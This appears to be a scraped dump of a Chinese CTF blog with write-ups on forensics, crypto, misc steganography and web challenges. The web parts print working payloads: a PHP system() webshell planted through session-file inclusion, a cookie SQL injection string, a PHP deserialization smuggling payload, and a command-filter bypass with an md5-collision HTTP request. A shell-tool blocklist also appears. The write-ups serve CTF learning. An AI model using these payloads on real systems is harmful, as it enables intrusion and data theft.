9.追踪webshell包，发现了ifconfig命令。 -&gt;|eth0 Link encap:Ethernet HWaddr 00:0C:29:CB:9F:85 \\n ​ inet addr:192.168.32.189 Bcast:192.168.32.255 Mask:255.255.255.0\\n 10.打开mailtwo数据包，过滤http流，发现第一个数据包里面的动作是登出，发现了用户名wenwenni。 然后看28号数据包的操作是访问登录页面，35号数据包发现了密码加密函数。 是AES-CBC加密，key为1234567812345678。 继续看42 44数据包，还是wenwenni用户登录，并且返回了 success true. 尝试使用如下过滤器过滤: 1(http contains &quot;&#123;\\&quot;success\\&quot;:true&#125;&quot; or http.request.method&#x3D;&#x3D;&quot;POST&quot;) and ip.addr&#x3D;&#x3D;192.168.94.59 发现到最后也没爆破成功（这题看的别人的思路，我没懂） 然后打开mailto1 继续使用上述语句过滤 发现18512登陆成功，则密码在17126号数据包中。+ZgE14UGcFcyRGLI0/ZXPQ== 密码为1234567812345678的MD5值，偏移量为1234567812345678 AES解密得admin!@#PASS123 11.第一个vpn数据包在尝试登录vpn，然后看第二个。 统计一下会话信息，发现10.3.4.3 10.3.4.96 10.3.4.55 这几个ip之间的通信较多，然后过滤看看。 过滤一下smb协议，发现10.3.4.96是SMB服务器。 然后在看一下55这个ip ip.addr==10.3.4.55 发现10.3.4.3首先ping了10.3.4.55 所以确定10.3.4.3是黑客使用的vpn服务器。 总结对一些有手就行的过滤方法用的还可以，但是深入一点就不太行了 对一些流量动作的分析不太到位，对filter的用法也不太熟悉，比如\\表转义。继续学习！ 待学习：PPTP协议、SMB协议参考https://blog.csdn.net/qq_43431158/article/details/107176918","categories":[],"tags":[]},{"title":"安洵杯misc全wp","slug":"安洵杯misc全wp","date":"2020-11-26T09:42:26.000Z","updated":"2020-11-26T09:42:44.000Z","comments":true,"path":"2020/11/26/安洵杯misc全wp/","link":"","permalink":"https://polosec.github.io/2020/11/26/%E5%AE%89%E6%B4%B5%E6%9D%AFmisc%E5%85%A8wp/","excerpt":"","text":"密码学 爆破SECRET是不知道的 flag是md5(SECRET).hexdigest() 已知部分flag为 1d0g3&#123;71b2b5616**2a4639**7d979**de964c&#125; cipher是sha256加密后的flag，其摘要为 0596d989a2938e16bcc5d6f89ce709ad9f64d36316ab80408cb6b89b3d7f064a 现在不知道secret。 str1=”71b2b5616” str2=”2a4639” str3=”7d979” str4=”de964c” str1 2 3 4 之间分别有两位不知道 爆破的话需要爆破16^6次。 直接爆破 12345678910111213141516171819import hashlibbroken_flag= &#x27;71b2b5616**2a4639**7d979**de964c&#x27;str1=&quot;d0g3&#123;71b2b5616&quot;str2=&quot;2a4639&quot;str3=&quot;7d979&quot;str4=&quot;de964c&#125;&quot;cipher=&#x27;0596d989a2938e16bcc5d6f89ce709ad9f64d36316ab80408cb6b89b3d7f064a&#x27;def getdigest(content): return hashlib.sha256(content).hexdigest()alphabet=&quot;1234567890abcdef&quot;for a in alphabet: for b in alphabet: for c in alphabet: for d in alphabet: for e in alphabet: for f in alphabet: string=str1+a+b+str2+c+d+str3+e+f+str4 if getdigest(string)==cipher: print string misc签到扫码套娃，然后得到一个flag.docx，里面一串乱码，而且公众号也提示了不是emojidecode，但是这玩意除了emojidecode还能是啥？ 因为我的word2016无法显示emoji，然后我换成rar解压，在xml里面看到了emoji，放到在线解密工具即可。（师傅们直接复制过去就完事了） 王牌特工这道题一开始没啥思路，然后file看一下是ext3格式。网上搜了一篇教程就差不多出来了。 https://blog.ihomura.cn/2018/08/03/WriteUp-ext3-%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D-HZ-file/ 工具：fsstat，ext3grep，veracrypt。 装ext3grep的时候，报错了按照网上说的做增添一些东西，我这还会报错，把最后报错的那一行注释掉就完事儿了。 首先使用fsstat看镜像信息。 fsstat findme 其中root directory比较重要（我也不知道为什么） 接下来使用ext3grep查看文件信息。 ext3grep –inode 2 findme 恢复这个东西 ext3grep –restore-file .coolboy.swp findme vim -r .coolboy.swp 新建一个目录/root/coolboy 恢复完会放到这里面，base64解码后的内容为： 1真的密码:this_is_a_true_key 用这个密码使用veracrypt去挂载flagbox，就可以获得flag。 misc3一开始是hardzip，有个密码1，看文件比较短尝试CRC32爆破，爆破完的密码拼起来就是easyzip的解压密码。 解压下来easyzip， 通过伪加密拿到redeme.txt，尝试明文攻击。 这里需要注意的是，使用明文攻击需要保证待破解压缩包里只有一个文件，也就是已知文件。因为这里面有一个伪加密，其他文件的压缩算法可能与已知文件的不一致，所以为了保证顺利进行，需要将其他文件删除（这道题所需要，其他情况下如果加密方式都一样的话就不用删除。） misc4npmtxt打开一看啥也不懂，010editor打开一看有看不懂的东西，搜了搜16进制慢慢搜就搜到了0宽隐写。 把那一串复制到https://yuanfux.github.io/zero-width-web/ decode就可以获得解压密码 RealV1siBle 打开是张图，silenteye一把梭出来flag。 总结这次比赛觉得web比较难，ssti没做出来比较上心。最近打算深度学习ssti相关内容，争取下次做出来！","categories":[],"tags":[]},{"title":"山东省新一代攻防赛wp","slug":"山东省新一代攻防赛wp","date":"2020-11-23T14:01:58.000Z","updated":"2020-11-26T09:53:35.000Z","comments":true,"path":"2020/11/23/山东省新一代攻防赛wp/","link":"","permalink":"https://polosec.github.io/2020/11/23/%E5%B1%B1%E4%B8%9C%E7%9C%81%E6%96%B0%E4%B8%80%E4%BB%A3%E6%94%BB%E9%98%B2%E8%B5%9Bwp/","excerpt":"","text":"前言打聊城的比赛，又白给了，拿了参与奖，做出来两个misc，剩下两个misc都做了快一半，没思路了，特来复现。 webweb1打开之后是一个登陆页面，查看源码发现了测试账号test/test 查看robots.txt 发现php.php 发现是phpinfo。 登录之后发现可能存在LFI，然后上了下扫描器，扫到了一些文件，尝试包含info.php，得到源码，然后发现了include了template/info.html，于是访问。查看源码发现了hint m4nageee.php。然后读manage的源码，在源码中发现包含了2333.html，于是访问。 查看源码时发现了php代码，尝试PHP session文件包含。 但是需要session的存放位置，于是通过扫描到的php.php查看session日志的存放位置/var/lib/php5，遂包含之。 在m4nageee里面写nickname到session文件里面，利用LFI包含getshell。 当前我的phpsessid为0u335c2ud2h9gjq0lq6nos1i72 所以session文件就是/var/lib/php5/sess_0u335c2ud2h9gjq0lq6nos1i72,包含即可。 nikename里面写 12345678 &lt;?php system(&quot;cat fla*&quot;)； ?&gt; 即可绕过对flag的过滤或者这样写&lt;?php system(&quot;cat fl\\ag_0ba7bc92fcd57e337ebb9e74308c811f&quot;); ?&gt;等等。。 web2 web3题目提示使用sqlmap注入，但是我注入巨拉跨。。而且数据库是sqlite的，我只会一点mysql的注入。。当时没做出来，赛后复现下。 这题是使用cookie注入。我明确地知道自己不会用sqlmap进行cookie注入。 不会 跟官方的思路没复现出来，等wp。这里放下济大师傅的web2 web3的payload： Cookie: PHPSESSID=da55nb2kgsge2luvc5m53k5r90; username=test; password=test’ OR 1=1 LIMIT 1 OFFSET 1 – password=test’ OR 1=1 LIMIT 1 OFFSET 1 – ; userinfo=eyJ1c2VybmFtZSI6InRlc3QiLCJwYXNzd29yZCI6InRlc3QnIE9SIDE9MSBMSU1JVCAxIE9GRlNFVCAxIC0tICJ9Cg%3D%3D miscez_decode简单的编码转换： 1&amp;#54;&amp;#54;&amp;#54;&amp;#99;&amp;#54;&amp;#49;&amp;#54;&amp;#55;&amp;#55;&amp;#98;&amp;#54;&amp;#54;&amp;#51;&amp;#57;&amp;#54;&amp;#52;&amp;#54;&amp;#54;&amp;#51;&amp;#53;&amp;#51;&amp;#52;&amp;#51;&amp;#48;&amp;#51;&amp;#49;&amp;#51;&amp;#48;&amp;#51;&amp;#48;&amp;#51;&amp;#56;&amp;#51;&amp;#51;&amp;#54;&amp;#50;&amp;#51;&amp;#48;&amp;#54;&amp;#54;&amp;#51;&amp;#49;&amp;#54;&amp;#54;&amp;#51;&amp;#50;&amp;#51;&amp;#51;&amp;#54;&amp;#49;&amp;#51;&amp;#51;&amp;#54;&amp;#53;&amp;#54;&amp;#49;&amp;#54;&amp;#53;&amp;#54;&amp;#51;&amp;#54;&amp;#51;&amp;#51;&amp;#53;&amp;#54;&amp;#52;&amp;#51;&amp;#53;&amp;#54;&amp;#49;&amp;#51;&amp;#55;&amp;#54;&amp;#51;&amp;#55;&amp;#100; html实体编码-&gt;hexo2string-&gt;flag flag{f9df54010083b0f1f23a3eaecc5d5a7c} qr_code: 打开很多二维码，盲猜扫出来内容转0和1 比赛的时候有个简单的读二维码的工具，但是批量不会写脚本。。就读了两个，看哪个是0哪个是1，然后bin2ascii就可以了。 用脚本的做法： 1234567891011121314151617181920212223242526272829# -*-coding:utf8 -*-import osimport zxingimport binasciiimport base64reader=zxing.BarCodeReader()asc=&#x27;&#x27;path=&quot;C:\\\\Users\\\\Administrator\\\\Desktop\\\\聊城\\\\qrcode&quot;files=os.listdir(path)for i in range (0,len(files)-1): # try: # content=reader.decode(file).raw # if content==&quot;zero&quot;: # asc+=str(0) #这是识别二维码的方法 # if content==&quot;one&quot;: # asc+=str(1) # except: # pass size=os.path.getsize(str(i)+&quot;.png&quot;) #这是使用filesize做的方法 if size==3409: asc+=&#x27;0&#x27; else: asc+=&#x27;1&#x27;asc=int(asc,base=2)print(asc)asc=hex(asc)asc=asc[2:]print(binascii.a2b_hex(asc).decode()) flag{duyoulikeit} relax打开是个.flag结尾的文件，丢进010editor看见是PK开头，考虑zip，解压出来一个flag.txt 一个音频。 flagtxt里面的base64解出来啥也不是，于是继续看音频。 考虑音频隐写，在文件详细信息里面发现了一串base64,解码后打开mp3stego，输入这个密码，得到了一串fakeflag： fakeflag{same_length_with_true_flaghh} 和真的长的一样呢，真真假假 后面就没思路了。 后来看师傅的wp说需要讲该字符串与之前解出来啥也不是的base64异或就可以得到flag。草。 上脚本： 12345678910import base64with open(&quot;flag.txt&quot;) as f: str1=f.readline()str1=base64.b64decode(str1)fakeflag=&quot;fakeflag&#123;same_length_with_true_flaghh&#125;&quot;.encode()flag=&quot;&quot;for i in range (len(fakeflag)): tmp=fakeflag[i]^str1[i] flag+=chr(tmp)print( flag) 这里需要注意的是：encode()方法是str类型提供的，将其转换为byte类型。decode（）方法是将byte类型转化为str类型。之前我都是出错了就直接瞎encode，decode，咋对咋弄。。今天终于知道了。 flag：flag{9ff3a239027a7089237686b384862d33} base64base64套娃，光想着basecrack，结果直接卡死。。就是没想起来自己写脚本。 附上hxd的脚本 1234567891011121314151617181920212223242526272829import base64with open (&quot;base.txt&quot;,&quot;rb&quot;) as f: content=f.read()while True: try: content=base64.b16decode(content).decode() print(&quot;b16&quot;) print(content) except: try: content=base64.b32decode(content).decode() print(&quot;b32&quot;) print(content) except: try: content=base64.b64decode(content).decode() print(&quot;b64&quot;) print(content) except: try: content=base64.b85decode(content).decode() print(&quot;b85&quot;) print(content) except: break; flag:flag{4b057431c3ee0c4f56d4dad18c352375}","categories":[],"tags":[]},{"title":"取证专题","slug":"取证专题","date":"2020-11-17T03:49:09.000Z","updated":"2020-11-17T04:32:36.000Z","comments":true,"path":"2020/11/17/取证专题/","link":"","permalink":"https://polosec.github.io/2020/11/17/%E5%8F%96%E8%AF%81%E4%B8%93%E9%A2%98/","excerpt":"","text":"取证需要用到的工具： volatility、注册表分析工具（WRR）、AXIOM等。 例题分析湖湘杯misc首先看一下imageinfo 1volatility -f 用户名注册表.vmem imageinfo 选择一个supported profile，这里选第一个不行，所以选第二个Win2003SP2x86 先扫一下pslist volatility -f 用户名注册表.vmem –profile=Win2003SP2x86 pslist 除了winlogon.exe之外没啥收获，然后扫一下网络，也没啥收获。 后面尝试扫描connscan，cmdscan，notepad。 在扫notepad的时候发现了一些东西，于是尝试扫一下后缀为.txt的文件，看看有没有收获。 发现了一个file.txt，尝试dump到本地。 1volatility -f 用户名注册表.vmem --profile&#x3D;Win2003SP2x86 dumpfiles -Q 0x000000000412cde0 -D .&#x2F; dump下来的文件内容为 什么？计算机又被不知名账户登录了？明明在计算机管理中没有这个用户，为什么还会被这个用户登录呢？电脑跟前的你能帮我找到原因吗？flag为该用户的用户名以及密码的md5值。 格式：md5(用户名:密码） 下面考虑在注册表中找一下隐藏用户。 首先看一下注册表。 1volatility -f 用户名注册表.vmem --profile&#x3D;Win2003SP2x86 hivelist volatility -f 用户名注册表.vmem --profile&#x3D;Win2003SP2x86 hivelist 发现了SAM表。SAM表是存储了电脑登录用户相关信息的表，尝试dump出SAM表。 1volatility -f 用户名注册表.vmem --profile&#x3D;Win2003SP2x86 dumpregistry -D .&#x2F; 然后使用注册表分析工具打开。 可以看到很多隐藏账户，一个个看看是否有last logon 这个属性。 最后找到了用户 FHREhpe，然后再回到volatility里面hashdump 出来关于他的账号密码。 123volatility -f 用户名注册表.vmem --profile&#x3D;Win2003SP2x86 hashdump | grep FHREhpe有如下数据：FHREhpe$:1171:70fdb8f853bd427d7584248b8d2c9f9e:f3cf477fc3ea6ec0b3b5887616dd4506::: Windows系统下的hash密码格式为：用户名称*:RID:LM-HASH值:NT-HASH*值 获得NT HASH值后可以去md5网站解密，解密后的密码是NIAIWOMA 然后将其MD5加密后即可获得flag。 参考链接https://bbs.ichunqiu.com/thread-59102-1-1.html https://www.sqlsec.com/2019/11/winhash.html","categories":[],"tags":[{"name":"取证","slug":"取证","permalink":"https://polosec.github.io/tags/%E5%8F%96%E8%AF%81/"}]},{"title":"1104学习笔记","slug":"1104学习笔记","date":"2020-11-09T08:52:34.000Z","updated":"2020-11-09T08:54:26.000Z","comments":true,"path":"2020/11/09/1104学习笔记/","link":"","permalink":"https://polosec.github.io/2020/11/09/1104%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"python文件反编译103F30D0A79CB05586300000000000000000100000040000000730D0000006400008400005A000064010053280200000063000000000300000016000000430000007378000000640100640200640300640400640500640600640700640300640800640900640A00640600640B00640A00640700640800640C00640C00640D00640E00640900640F006716007D00006410007D0100781E007C0000445D16007D02007C01007400007C0200830100377D0100715500577C010047486400005328110000004E6966000000696C00000069610000006967000000697B000000693300000069380000006935000000693700000069300000006932000000693400000069310000006965000000697D000000740000000028010000007403000000636872280300000074030000007374727404000000666C6167740100000069280000000028000000007304000000312E7079520300000001000000730A0000000001480106010D0114014E280100000052030000002800000000280000000028000000007304000000312E707974080000003C6D6F64756C653E010000007300000000 使用010editor编辑，paste from hex，然后另存为1.pyc。python安装uncompyle , pip install uncompyle下面就是 uncompyle 1.pyc&gt;1.py 123456789def flag(): str = [ 102, 108, 97, 103, 123, 51, 56, 97, 53, 55, 48, 51, 50, 48, 56, 53, 52, 52, 49, 101, 55, 125] flag = &#x27;&#x27; for i in str: flag += chr(i) print flagflag() 运行即可获得flag base64隐写解密脚本 1234567891011121314151617181920212223242526272829303132333435def get_base64_diff_value(s1, s2): base64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27; res = 0 for i in xrange(len(s2)): if s1[i] != s2[i]: return abs(base64chars.index(s1[i]) - base64chars.index(s2[i])) return resdef solve_stego(): with open(&#x27;1.txt&#x27;, &#x27;rb&#x27;) as f: file_lines = f.readlines() bin_str = &#x27;&#x27; for line in file_lines: steg_line = line.replace(&#x27;\\n&#x27;, &#x27;&#x27;) norm_line = line.replace(&#x27;\\n&#x27;, &#x27;&#x27;).decode(&#x27;base64&#x27;).encode(&#x27;base64&#x27;).replace(&#x27;\\n&#x27;, &#x27;&#x27;) diff = get_base64_diff_value(steg_line, norm_line) print diff pads_num = steg_line.count(&#x27;=&#x27;) if diff: bin_str += bin(diff)[2:].zfill(pads_num * 2) else: bin_str += &#x27;0&#x27; * pads_num * 2 print goflag(bin_str)def goflag(bin_str): res_str = &#x27;&#x27; for i in xrange(0, len(bin_str), 8): res_str += chr(int(bin_str[i:i + 8], 2)) return res_strif __name__ == &#x27;__main__&#x27;: solve_stego() 直接输入base64隐写后的内容即可","categories":[],"tags":[]},{"title":"反序列化专题","slug":"反序列化专题","date":"2020-11-03T11:54:08.000Z","updated":"2020-11-09T08:51:56.000Z","comments":true,"path":"2020/11/03/反序列化专题/","link":"","permalink":"https://polosec.github.io/2020/11/03/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E9%A2%98/","excerpt":"","text":"最近对反序列化产生了一些兴趣，所以开此篇内容记录所遇到的反序列化的问题。安洵杯 easy_serialize_php题目代码： 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$function &#x3D; @$_GET[&#39;f&#39;];function filter($img)&#123; $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;); $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;; return preg_replace($filter,&#39;&#39;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;$_SESSION[&#39;function&#39;] &#x3D; $function;extract($_POST);if(!$function)&#123; echo &#39;&lt;a href&#x3D;&quot;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;;&#125;if(!$_GET[&#39;img_path&#39;])&#123; $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;);&#125;else&#123; $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));&#125;$serialize_info &#x3D; filter(serialize($_SESSION));if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123; highlight_file(&#39;index.php&#39;);&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123; eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!&#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123; $userinfo &#x3D; unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));&#125; 题目分析大概的流程是从浏览器接受GET方式的function，根据提示在phpinfo里面有东西。 进入phpinfo后搜索得到 d0g3_f1ag.php这个文件，于是猜测需要通过反序列化构造执行至程序最后一行的file_get_contnets(). 那么看file_get_contents()是对 经过滤后、序列化后的serialize_info的反序列化取其img属性的结果。 先不管正则过滤，我们的目的是构造一个输入，让img的value为base64加密后的d0g3_f1ag.php。 目标结果如下： 1a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:14:&quot;highlight_file&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; 但是正常输入的话我们是无法绕过 img_path 的判定的。 所以这里根据过滤入手，根据正则表达式以及preg_repace我们可以知道，将一些关键字替换成了无，即去掉。 这里我们可以使用POST方法，对_SESSION[]数组传参，传入的key为黑名单的值，这样在序列化完之后会吃掉该key的部分value。 听不懂正常，一开始我也听不懂，我就不像其他博主一样给你用不同的颜色标出来哪里是吃掉的部分了。 首先要了解php序列化后的语法（这里不赘述） 我们先随便写写，先POST个_SESSION[flag]=s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;} 看看结果是什么（把代码拷贝到本地，然后本地运行，echo或者var_dump出来序列化后的结果）： a:2:{s:4:””;s:39:”s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw==”;}”;s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw==”;} 但是这样是不能正常反序列化的，因为不符合反序列化的语法规则。根据语法规则知道，如果我们想让img作为key，base64加密后的东西作为value的话，需要让上一个对象是正常的，符合序列化后的字符串的语法。 从前往后看，第一个对象的key为**”;s:**，这样会导致后面的字符串无法正常地反序列化。 所以，接下来需要做的是先把第一个对象的key和value补全，让其能正常地反序列化。 补全第一个key的话，需要让第一个key为**”;s:39:”**，所以需要在POST里面传入_SESSION[flagflag]，这样能吞掉八个位置。正好能让本段话加粗的内容作为第一个key（这里建议自己写写试试，看看是否符合反序列化语法的规则。） 补全之后请大家自己var_dump或者输出，我这里不会给出补全后输出的序列化结果。 补全后发现，第一个对象可以正常序列化了，但是问题就是第二个对象的key成了第一个对象的value。 所以这里需要给第一个对象补个key，给_SESISON[flagflag]继续传值就可以，具体传什么，为什么要这样传，我也不会说。总之我们的目的是传一个符合序列化格式的value，并且传入后也需要让前后都符合序列化格式。 随便写一个就好 比如 s:3:”aaa”; 首先你把他写进去，然后根据序列化格式在前后添加相关符号。连同刚才写的s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}一起就是_SESSION[flagflag]= s:3:”aaa”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;} 现在放进去看看是什么效果。是否能够正常反序列化 a:2:{s:8:””;s:46:”s:3:”aaa”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}”;s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw==”;} 这样发现还是不能正常地反序列化，因为不符合语法。在s:3前缺少上一个字段的闭合”; 加上就好。 所以最终的payload就是 _SESSION[flagflag]=”;s:3:”aaa”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;} 打过去后查看源码，发现 12345&lt;?php$flag = &#x27;flag in /d0g3_fllllllag&#x27;;?&gt; 下面继续打对应的文件就好了~ _SESSION[flagflag]=”;s:3:”aaa”;s:3:”img”;s:20:”L2QwZzNfZmxsbGxsbGFn”;} 打进去即可获得一枚flag。","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://polosec.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"安洵杯web","slug":"安洵杯web","date":"2020-10-30T16:11:37.000Z","updated":"2020-10-30T16:12:16.000Z","comments":true,"path":"2020/10/31/安洵杯web/","link":"","permalink":"https://polosec.github.io/2020/10/31/%E5%AE%89%E6%B4%B5%E6%9D%AFweb/","excerpt":"","text":"致谢https://www.cnblogs.com/Cl0ud/p/12585242.html 题目分析打开题目，观察URL为http://31d9d742-c1f3-428c-860d-b09b30c2b2d9.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd= 于是猜测有个文件读取和命令执行，但是文件读取的格式是加密的，考虑base64解密，解密两次后再hex2ascii，可以得到文件名。 copy大佬的脚本，输入文件名即可得到根据此加密规律加密后的文件名： 123456789import binasciiimport base64filename = input().encode(encoding=&#x27;utf-8&#x27;)hex = binascii.b2a_hex(filename) #b2a是返回二进制数据的16进制表示print(hex)base1 = base64.b64encode(hex)base2 = base64.b64encode(base1)print(base2.decode()) 输入index.php后可以得到index.php文件名的加密后的名字，放到img里面查看源代码为base64加密的，把base64解密后即可得到index.php的源代码 index.php源码如下： 123456789101112131415161718192021222324252627282930313233343536&lt;?phphighlight_file(__FILE__);error_reporting(E_ALL || ~ E_NOTICE);header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);$cmd &#x3D; $_GET[&#39;cmd&#39;];if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;&#39;);$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);if (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123; echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;; die(&quot;xixi～ no flag&quot;);&#125; else &#123; $txt &#x3D; base64_encode(file_get_contents($file)); echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;; echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#39;|\\&quot;|\\&#96;|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123; echo(&quot;forbid ~&quot;); echo &quot;&lt;br&gt;&quot;;&#125; else &#123; if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123; echo &quot;success&quot;; &#125; else &#123; echo (&quot;md5 is funny ~&quot;); &#125;&#125;?&gt;&lt;html&gt;&lt;body&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 对源码进行审计，重点在命令执行部分。 命令执行有很多过滤，这里过滤不完全（正则表达式有待学习），可用ca\\t%20fl\\ag绕过。 在命令执行前需要满足 1if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) 这里可以考虑fastcoll构造两个hash值相同的二进制文件。 我这里构造好了，具体的使用方法可以百度fastcoll。 使用该软件构造好后，使用如下php脚本可以获得urlencode后的md5值： 12345678910111213141516171819&lt;?php function readmyfile($path)&#123; $fh &#x3D; fopen($path, &quot;rb&quot;); $data &#x3D; fread($fh, filesize($path)); fclose($fh); return $data;&#125;echo &#39;二进制hash &#39;. md5( (readmyfile(&quot;1.txt&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;\\r\\n&quot;;echo &#39;URLENCODE &#39;. urlencode(readmyfile(&quot;1.txt&quot;));echo &quot;&lt;br&gt;&lt;br&gt;\\r\\n&quot;;echo &#39;URLENCODE hash &#39;.md5(urlencode (readmyfile(&quot;1.txt&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;\\r\\n&quot;;echo &#39;二进制hash &#39;.md5( (readmyfile(&quot;2.txt&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;\\r\\n&quot;;echo &#39;URLENCODE &#39;. urlencode(readmyfile(&quot;2.txt&quot;));echo &quot;&lt;br&gt;&lt;br&gt;\\r\\n&quot;;echo &#39;URLENCODE hash &#39;.md5( urlencode(readmyfile(&quot;2.txt&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;\\r\\n&quot;; 下面将这两个MD5值分别给POST的a和b赋值，同时URL的?cmd=ca\\t%20fl\\ag 这里我踩了个坑，一开始是GET方式提交请求，然后手动改方法为POST，一直不能成功，后来发现可能是某些请求头的问题，我这里用hackbar发送POST请求，请求体随便写，在BP里面抓包，将请求体的内容改成a和b的值，在此之后即可愉快地命令执行。 payload: 123a=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%3B%11%1B%7E%CD%C3%A0h4E%95%0E%CC%BBq%7E%C2U%DF%23%92X%29%5D6%AA%3F%1E%D3%CC%9C%04v%E4%CA%E2%EA%EC%84%0Bk%24nC%C5%09s%B1%ADQ%9E%26%0C%FC%95%90%D9%04X%88%FAD%EA%2A%AFI%B2R%D3%EAQ%A6.rJ%E5%9A%94%97%3Cx%D1%A6G%F7UGL%10%C9%F4v%CE%B6%80%9E%9D%EF3%C6%26Q%94h%C2G%F5%B9%99%E4%A4%DD%D4%8C%3B%3D%B8%CE%13%A7%5B%D8%99%5C%2A%9A%E7%CC&amp;b=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%3B%11%1B%7E%CD%C3%A0h4E%95%0E%CC%BBq%7E%C2U%DF%A3%92X%29%5D6%AA%3F%1E%D3%CC%9C%04v%E4%CA%E2%EA%EC%84%0Bk%24nC%C5%89s%B1%ADQ%9E%26%0C%FC%95%90%D9%04X%08%FAD%EA%2A%AFI%B2R%D3%EAQ%A6.rJ%E5%9A%94%97%3Cx%D1%A6%C7%F7UGL%10%C9%F4v%CE%B6%80%9E%9D%EF3%C6%26Q%94h%C2G%F5%B9%99d%A4%DD%D4%8C%3B%3D%B8%CE%13%A7%5B%D8%99%DC%2A%9A%E7%CC 请求包: 123456789101112131415POST /index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=ca\\t%20/fl\\ag HTTP/1.1Host: 31d9d742-c1f3-428c-860d-b09b30c2b2d9.node3.buuoj.cnContent-Length: 1029Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://31d9d742-c1f3-428c-860d-b09b30c2b2d9.node3.buuoj.cnContent-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://31d9d742-c1f3-428c-860d-b09b30c2b2d9.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: 